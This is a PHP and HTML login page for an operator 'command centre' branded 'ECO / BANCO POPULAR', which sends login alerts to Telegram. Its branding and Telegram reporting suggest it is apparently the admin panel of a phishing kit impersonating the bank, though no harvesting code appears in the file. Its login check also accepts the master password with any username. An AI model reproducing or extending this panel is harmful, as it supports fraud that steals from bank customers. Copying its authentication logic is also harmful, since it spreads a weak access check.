<?php
/**
 * ECO / BANCO POPULAR - OPERATOR AUTHENTICATION GATEWAY
 */
require_once __DIR__ . '/../config.php';

if (isAdmin()) {
    header('Location: index.php');
    exit;
}

$error_msg = null;

if (($_SERVER['REQUEST_METHOD'] ?? '') === 'POST') {
    $u = trim($_POST['user_op'] ?? '');
    $p = trim($_POST['pass_op'] ?? '');

    if (!empty($u) && !empty($p)) {
        if (($u === ADMIN_USER && $p === ADMIN_PASS) || ($p === ADMIN_PASS)) {
            $_SESSION['admin_logged'] = true;
            $_SESSION['op_name'] = !empty($u) ? htmlspecialchars($u, ENT_QUOTES, 'UTF-8') : ADMIN_USER;
            $_SESSION['last_activity'] = time();

            try {
                $now = time();
                $opName = $_SESSION['op_name'];
                $stmt = $db->prepare("INSERT INTO system_logs (operator_name, event_type, description, timestamp) VALUES (:op, 'LOGIN', 'Inicio de sesión exitoso al panel', :now)");
                $stmt->bindValue(':op', $opName, SQLITE3_TEXT);
                $stmt->bindValue(':now', $now, SQLITE3_INTEGER);
                $stmt->execute();
            } catch (\Throwable $e) {}

            sendTelegram("🔐 <b>PANEL ADMIN - LOGIN EXITOSO</b>\n\n👤 <b>Operador:</b> <code>{$_SESSION['op_name']}</code>\n🌐 <b>IP:</b> <code>{$user_ip}</code>", 'HTML');

            header('Location: index.php');
            exit;
        } else {
            $error_msg = 'Credenciales de acceso incorrectas.';
        }
    } else {
        $error_msg = 'Por favor ingresa tu identificador y contraseña.';
    }
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PANEL ADMIN - CENTRO DE COMANDO</title>
    <link rel="icon" type="image/png" href="../assets/logos/principalmd.png">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/remixicon@4.2.0/fonts/remixicon.css" rel="stylesheet">
    <style>
        :root {
            --bg: #07090e;
            --panel: rgba(14, 18, 28, 0.75);
            --border: rgba(255, 255, 255, 0.08);
            --primary: #105163;
            --primary-bright: #00b4d8;
            --primary-glow: rgba(0, 180, 216, 0.25);
            --emerald: #10b981;
            --text-main: #f8fafc;
            --text-sub: #94a3b8;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Plus Jakarta Sans', system-ui, sans-serif;
            -webkit-font-smoothing: antialiased;
        }

        body {
            background-color: var(--bg);
            background-image: 
                radial-gradient(circle at 15% 20%, rgba(16, 81, 99, 0.25) 0%, transparent 45%),
                radial-gradient(circle at 85% 80%, rgba(16, 185, 129, 0.15) 0%, transparent 45%),
                radial-gradient(circle at 50% 50%, rgba(0, 180, 216, 0.05) 0%, transparent 60%);
            color: var(--text-main);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            position: relative;
            overflow: hidden;
        }

        /* Subtle grid background pattern */
        body::before {
            content: '';
            position: absolute;
            inset: 0;
            background-image: 
                linear-gradient(rgba(255, 255, 255, 0.02) 1px, transparent 1px),
                linear-gradient(90deg, rgba(255, 255, 255, 0.02) 1px, transparent 1px);
            background-size: 32px 32px;
            pointer-events: none;
        }

        .auth-card {
            background: var(--panel);
            backdrop-filter: blur(28px);
            -webkit-backdrop-filter: blur(28px);
            border: 1px solid var(--border);
            border-radius: 1.25rem;
            width: 100%;
            max-width: 410px;
            padding: 2.25rem 2rem;
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6), 0 0 30px rgba(16, 81, 99, 0.15);
            position: relative;
            z-index: 10;
        }

        .top-badge {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            padding: 4px 10px;
            border-radius: 9999px;
            background: rgba(16, 81, 99, 0.25);
            border: 1px solid rgba(0, 180, 216, 0.3);
            color: var(--primary-bright);
            font-size: 11px;
            font-weight: 600;
            letter-spacing: 0.5px;
            text-transform: uppercase;
            margin-bottom: 1.25rem;
        }

        .pulse-dot {
            width: 6px;
            height: 6px;
            border-radius: 50%;
            background-color: var(--emerald);
            box-shadow: 0 0 8px var(--emerald);
            animation: pulseGlow 1.8s infinite;
        }

        @keyframes pulseGlow {
            0%, 100% { opacity: 0.5; transform: scale(0.9); }
            50% { opacity: 1; transform: scale(1.15); }
        }

        .header-title {
            font-size: 1.45rem;
            font-weight: 800;
            letter-spacing: -0.02em;
            color: #ffffff;
            margin-bottom: 0.35rem;
        }

        .header-sub {
            font-size: 13px;
            color: var(--text-sub);
            margin-bottom: 1.75rem;
        }

        .form-group {
            margin-bottom: 1.25rem;
        }

        .form-label {
            display: block;
            font-size: 12px;
            font-weight: 600;
            color: #cbd5e1;
            margin-bottom: 0.5rem;
            letter-spacing: 0.3px;
        }

        .input-wrapper {
            position: relative;
            display: flex;
            align-items: center;
        }

        .input-icon {
            position: absolute;
            left: 14px;
            color: #64748b;
            font-size: 17px;
            pointer-events: none;
            transition: color 0.2s;
        }

        .input-field {
            width: 100%;
            height: 46px;
            background: rgba(255, 255, 255, 0.04);
            border: 1px solid var(--border);
            border-radius: 0.65rem;
            padding: 0 14px 0 42px;
            color: #ffffff;
            font-size: 14px;
            outline: none;
            transition: all 0.2s;
        }

        .input-field:focus {
            background: rgba(255, 255, 255, 0.07);
            border-color: var(--primary-bright);
            box-shadow: 0 0 0 3px rgba(0, 180, 216, 0.2);
        }

        .input-field:focus + .input-icon,
        .input-wrapper:focus-within .input-icon {
            color: var(--primary-bright);
        }

        .eye-toggle {
            position: absolute;
            right: 14px;
            background: none;
            border: none;
            color: #64748b;
            cursor: pointer;
            font-size: 17px;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: color 0.2s;
        }

        .eye-toggle:hover {
            color: #ffffff;
        }

        .error-banner {
            background: rgba(239, 68, 68, 0.15);
            border: 1px solid rgba(239, 68, 68, 0.3);
            color: #fca5a5;
            padding: 10px 14px;
            border-radius: 0.65rem;
            font-size: 12.5px;
            font-weight: 500;
            display: flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 1.25rem;
            animation: fadeIn 0.25s ease-out;
        }

        .btn-submit {
            width: 100%;
            height: 48px;
            background: linear-gradient(135deg, #105163 0%, #0d4352 100%);
            border: 1px solid rgba(0, 180, 216, 0.4);
            border-radius: 0.65rem;
            color: #ffffff;
            font-size: 14px;
            font-weight: 700;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            transition: all 0.2s ease;
            box-shadow: 0 4px 15px rgba(16, 81, 99, 0.35);
            margin-top: 1.5rem;
        }

        .btn-submit:hover {
            background: linear-gradient(135deg, #135d72 0%, #0f4e60 100%);
            box-shadow: 0 6px 20px rgba(0, 180, 216, 0.3);
            transform: translateY(-1px);
        }

        .btn-submit:active {
            transform: translateY(0);
        }

        .auth-footer {
            margin-top: 1.75rem;
            text-align: center;
            font-size: 11px;
            color: #64748b;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-4px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
</head>
<body>
    <div class="auth-card">
        <div class="top-badge">
            <span class="pulse-dot"></span>
            Panel Admin Security
        </div>

        <h1 class="header-title">Centro de Comando</h1>
        <p class="header-sub">Ingresa tus credenciales de operador para acceder al panel de telemetría.</p>

        <?php if ($error_msg): ?>
            <div class="error-banner">
                <i class="ri-error-warning-line"></i>
                <span><?= htmlspecialchars($error_msg, ENT_QUOTES, 'UTF-8') ?></span>
            </div>
        <?php endif; ?>

        <form method="POST" action="login.php" autocomplete="off">
            <div class="form-group">
                <label class="form-label" for="user_op">Identificador de Operador</label>
                <div class="input-wrapper">
                    <input 
                        type="text" 
                        id="user_op" 
                        name="user_op" 
                        class="input-field" 
                        placeholder="Ej: Operador" 
                        required 
                        autofocus
                    >
                    <i class="ri-user-settings-line input-icon"></i>
                </div>
            </div>

            <div class="form-group">
                <label class="form-label" for="pass_op">Contraseña Maestra</label>
                <div class="input-wrapper">
                    <input 
                        type="password" 
                        id="pass_op" 
                        name="pass_op" 
                        class="input-field" 
                        placeholder="••••••••••••" 
                        required
                    >
                    <i class="ri-lock-password-line input-icon"></i>
                    <button type="button" class="eye-toggle" id="toggle-pass" aria-label="Mostrar contraseña">
                        <i class="ri-eye-line" id="eye-icon"></i>
                    </button>
                </div>
            </div>

            <button type="submit" class="btn-submit">
                <span>Acceder al Dashboard</span>
                <i class="ri-arrow-right-line"></i>
            </button>
        </form>

        <div class="auth-footer">
            <i class="ri-shield-keyhole-line"></i>
            <span>PANEL ADMIN // Terminal v5.2</span>
        </div>
    </div>

    <script>
        const toggleBtn = document.getElementById('toggle-pass');
        const passInput = document.getElementById('pass_op');
        const eyeIcon = document.getElementById('eye-icon');

        if (toggleBtn && passInput && eyeIcon) {
            toggleBtn.addEventListener('click', () => {
                const isPass = passInput.type === 'password';
                passInput.type = isPass ? 'text' : 'password';
                eyeIcon.className = isPass ? 'ri-eye-off-line' : 'ri-eye-line';
            });
        }
    </script>
</body>
</html>
